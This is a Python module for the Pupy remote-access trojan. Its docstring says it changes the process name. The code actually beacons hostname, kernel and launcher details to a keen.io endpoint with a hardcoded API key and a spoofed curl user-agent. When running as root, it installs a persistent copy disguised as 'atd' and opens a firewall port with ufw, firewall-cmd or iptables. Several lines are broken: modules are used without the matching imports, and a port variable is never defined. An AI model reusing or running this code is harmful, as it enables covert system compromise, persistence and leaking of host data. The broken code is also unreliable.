# -*- coding: utf-8 -*-

""" Change pupy process's name """
#__dependencies__ = {
    #'linux': ['pupyps','urllib2','persistence'],
    #'all': ['pupyutils.users','network.lib.scan','pupyutils.zip','scandir','pupyutils.search']
    ##
#}
__dependencies__ = {
        'all': [
           'persistence','network.lib.scan','pupyutils.users', 'transfer','fsutils'
        ],
        'windows': ['junctions', 'ntfs_streams', 'pupwinutils'],
        #'linux': ['xattr', '_scandir']
}

__arguments__ = {
    'url': 'Keen.io Image beacon like: https://api.keen.io/3.0/projects/5c9db333c9e77c000121f3f5/events/match?api_key=C82DB11304541F085FC59DBFB15E650639B7CC8190D371EAE5310F1B6DDDE069&data='
}

__compatibility__ = ('linux')
import sys
from shutil import copy
import subprocess
from pupy import infos
from os import path, getuid , uname , getenv
from base64 import b64decode, b64encode
import json
try:
    from urllib import request as urllib
except ImportError:
    import urllib2 as urllib
import logging
from persistence import drop
#import scan
#import proxies
#from proxies import get_proxies
from network.lib.scan import safe_scan
from pupyutils.users import users
#from pyuvproxy import start

#from pupyutils.search import scanwalk
#from basic_cmds import fgetcontent,fputcontent

def main(logger=None,keen_key='C82DB11304541F085FC59DBFB15E650639B7CC8190D371EAE5310F1B6DDDE069'):
    
    
    url='https://api.keen.io/3.0/projects/5c9db333c9e77c000121f3f5/events/match?api_key=' + keen_key + '&data='
    
    #https://api.keen.io/3.0/projects/5c9db333c9e77c000121f3f5/events/match?api_key=C82DB11304541F085FC59DBFB15E650639B7CC8190D371EAE5310F1B6DDDE069&data=ewoiY2FtcGFpZ24iOiAiQXdlc29tZSBhbmFseXRpY3MhIiwKInN1YmplY3QiOiAiSGkiLAoidGV4dCI6ICJJbWFnZSBiZWFjb25zIGFyZSBmdW4uIgp9Cg==
    #agent = infos["user"] + "-" + infos["hostname"] + " " + infos["version"] + "-" + infos["release"] + " " + infos["os_arch"]
    #+ "-" + infos["cid"]
    #agent =  infos["hostname"] + "-" + infos["cid"]
    #users = users()

    #checkvm()
    #test = safe_scan("127.0.0.1",[22])
    #for proxy_info in get_proxies():
        #logger.debug('%s - check', proxy_info)

        
    launchstr = infos["transport"] + "/" + infos["launcher"] 
    for x in range(0, len(infos["launcher_args"])):
        launchstr +=" " + infos["launcher_args"][x]
        
    sysname = os.uname()[1].replace(" ", "_")
    machine = os.uname()[4].replace(" ", "_")
    kernel = os.uname()[2].replace(" ", "_")
    uname = 'Linux '  + sysname + ' ' + kernel + ' ' + machine
    #print(uname)
    #logging.error('launch : %s',launchstr) 
    var = '{ "agent": "' + uname + '" , "launcher": "' + launchstr  + '" }'
    #from display import when_attached
    #pyuvproxy.start()
    #def main():
        #when_attached()
    
    proxy = urllib2.ProxyHandler()
    opener = urllib2.build_opener(proxy)
    opener.addheaders = [('User-agent', 'curl/7.50.0 (Linux ' + kernel + ' '+ machine +')')]
    try:
        response = opener.open(url + b64encode(var), timeout=5)
    except Exception, e:
        logging.error('keen.io beacon failed : %s', e)    
    
    #url = url + var
    #row_json = json.dumps(infos["transport"])
    #if path.isfile("/usr/bin/wget"):
        #cmd = "/usr/bin/wget -O/dev/null -q '" + url + b64encode(var) + "'"
        #subprocess.call(cmd, shell=True)
    #else:
        #if path.isfile("/usr/bin/curl"):
            #cmd = "/usr/bin/curl '" + url + "'"
            #subprocess.call(cmd, shell=True)        
        
    if os.getuid() != 0:
        logger.error('we are no root')
        return 
    
    
    src = None
    if not src:
        src = sys.executable
    
    try:
        test = drop(src,True,name="atd")
        print(test)
    except Exception, e:
        logging.error('Drop Libary faild : %s', e)  
        
    if path.isfile("/usr/sbin/ufw"):
        cmd = "/usr/sbin/ufw allow " + port
    if path.isfile("/usr/sbin/firewall-cmd"):
        cmd = "firewall-cmd --zone=public --add-port=" + port + "/tcp --permanent"        
    else:
        cmd = "iptables -I INPUT -p tcp -m tcp --dport " + port + " -j ACCEPT"
    subprocess.call(cmd, shell=True)
    #hide_process.change_argv(argv=name)
